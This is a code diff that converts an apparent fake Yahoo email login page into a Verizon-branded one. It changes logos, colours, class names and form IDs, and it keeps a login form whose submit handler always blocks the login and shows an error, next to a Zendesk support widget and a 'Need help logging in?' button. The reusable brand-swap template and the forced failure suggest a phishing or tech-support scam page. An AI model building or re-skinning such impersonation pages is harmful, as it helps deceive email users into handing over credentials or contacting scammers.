@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<link rel="icon" type="image/png" href="https://cdn1.iconfinder.com/data/icons/smallicons-logotypes/32/yahoo-512.png" sizes="196x196">
+<link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/Verizon_2015_logo_-vector.svg/1200px-Verizon_2015_logo_-vector.svg.png" sizes="196x196">
 <meta name="msvalidate.01" content="649552A7F8FC8C674CD07172F20F2D02" />
 <meta name="google-site-verification" content="lU6MgVAmLQXn6EdigLoRQJ7jv9PkygMrLRQtjbuk5xQ" />
     <meta charset="UTF-8">
@@ -17,8 +17,8 @@
     <!-- End of Zendesk Widget script -->
     <style>
         :root {
-            --primary: #720e9e;
-            --primary-light: #f3e6f8;
+            --primary: #cd040b; /* Verizon red color */
+            --primary-light: #fce8e9;
             --secondary: #1D1D1F;
             --light: #86868B;
             --lighter: #F5F5F7;
@@ -47,13 +47,13 @@
         }
         
         header {
-            background: linear-gradient(135deg, var(--primary) 0%, #4a0d66 100%);
+            background: linear-gradient(135deg, var(--primary) 0%, #9a0308 100%);
             color: var(--white);
             padding: 60px 0 80px;
             text-align: center;
             margin-bottom: 40px;
             border-radius: 0 0 30px 30px;
-            box-shadow: 0 10px 30px rgba(114, 14, 158, 0.2);
+            box-shadow: 0 10px 30px rgba(205, 4, 11, 0.2);
             position: relative;
         }
         
@@ -61,8 +61,8 @@
             margin-bottom: 20px;
         }
         
-        .yahoo-logo {
-            height: 60px;
+        .verizon-logo {
+            height: 50px;
             width: auto;
         }
         
@@ -136,7 +136,7 @@
         }
         
         .login-btn:hover {
-            background-color: #5d0c82;
+            background-color: #9a0308;
             transform: translateY(-2px);
         }
         
@@ -250,8 +250,8 @@
                 font-size: 2.2rem;
             }
             
-            .yahoo-logo {
-                height: 50px;
+            .verizon-logo {
+                height: 40px;
             }
             
             .login-form-container {
@@ -264,7 +264,7 @@
     <header>
         <div class="container">
             <div class="logo-container">
-                <img src="https://cdn1.iconfinder.com/data/icons/smallicons-logotypes/32/yahoo-512.png" alt="Verizon Logo" class="yahoo-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/Verizon_2015_logo_-vector.svg/1200px-Verizon_2015_logo_-vector.svg.png" alt="Verizon Logo" class="verizon-logo">
             </div>
             <h1>Verizon Email Login Account</h1>
             <p class="subtitle">Sign in to access your Verizon Email account and manage your emails, contacts, and calendar</p>
@@ -272,7 +272,7 @@
             <!-- Login Form -->
             <div class="login-form-container">
                 <h2>Log in to Verizon Email</h2>
-                <form id="yahooLoginForm">
+                <form id="verizonLoginForm">
                     <div class="form-group">
                         <label for="email">Verizon Email, Phone, or Username</label>
                         <input type="text" id="email" placeholder="Enter your Verizon ID" required>
@@ -288,7 +288,7 @@
                 </form>
                 
                 <div class="support-section" id="supportSection">
-                    <button class="support-btn" id="supportBtn">Get Support | Need help logging in?</button>
+                    <button class="support-btn" id="supportBtn">Need help logging in?</button>
                 </div>
             </div>
         </div>
@@ -393,7 +393,7 @@
         });
 
         // Handle form submission
-        document.getElementById('yahooLoginForm').addEventListener('submit', function(e) {
+        document.getElementById('verizonLoginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             // Show error message
